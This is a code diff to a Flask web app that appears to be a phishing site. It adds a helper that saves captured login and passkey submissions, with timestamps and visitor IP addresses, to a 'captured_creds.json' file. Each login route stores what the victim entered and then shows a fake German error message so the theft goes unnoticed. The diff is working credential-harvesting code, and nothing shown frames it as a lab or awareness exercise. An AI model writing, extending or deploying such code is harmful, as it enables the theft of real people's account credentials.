@@ -2,15 +2,33 @@ from flask import Flask, request, render_template, render_template_string, redir
 import datetime
 import os
 
+import json
+
 # Get the directory where this script is located
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+CREDS_FILE = os.path.join(SCRIPT_DIR, 'captured_creds.json')
 
 app = Flask(__name__, 
             template_folder=SCRIPT_DIR,
             static_folder=SCRIPT_DIR, 
             static_url_path='')
 
-# Store login attempts in memory (or a file for persistence)
+# Helper to save credentials
+def save_cred(data):
+    creds = []
+    if os.path.exists(CREDS_FILE):
+        try:
+            with open(CREDS_FILE, 'r') as f:
+                creds = json.load(f)
+        except:
+            pass
+    
+    creds.append(data)
+    
+    with open(CREDS_FILE, 'w') as f:
+        json.dump(creds, f, indent=4)
+
+# Store login attempts in memory (for current session display)
 login_attempts = []
 
 @app.route('/')
@@ -43,6 +61,7 @@ def login():
     data['ip'] = request.remote_addr
     
     login_attempts.append(data)
+    save_cred(data)
     
     # Return the page with an error message
     return render_template('index.html', error="Ein unbekannter Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.")
@@ -56,19 +75,21 @@ def passkey_login():
     data['type'] = 'passkey_success'
     
     login_attempts.append(data)
+    save_cred(data)
     
     # Return error page
     return render_template('index.html', error="Ein unbekannter Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.")
 
 @app.route('/passkey-attempt', methods=['POST'])
 def passkey_attempt():
-    # Capture failed passkey attempts
+    # Capture passkey attempt (failed or cancelled)
     data = request.get_json()
     data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     data['ip'] = request.remote_addr
     data['type'] = 'passkey_failed'
     
     login_attempts.append(data)
+    save_cred(data)
     
     return {'status': 'logged'}
 
